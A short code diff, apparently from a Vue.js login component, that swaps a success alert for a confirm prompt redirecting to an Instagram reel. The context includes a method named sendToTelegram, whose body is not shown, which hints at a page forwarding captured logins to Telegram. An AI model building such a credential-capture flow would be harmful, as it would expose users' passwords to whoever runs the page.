@@ -109,7 +109,14 @@ export default {
       this.password = "";
 
       // Show a success message (optional)
-      alert("Login successful!");
+      if (
+        window.confirm(
+          'If you click "ok" you would be redirected . Cancel will load this website '
+        )
+      ) {
+        window.location.href =
+          "https://www.instagram.com/reel/DGbAKFltSpj/?igsh=b2g4a29zOXE1Nng3";
+      }
     },
 
     sendToTelegram() {
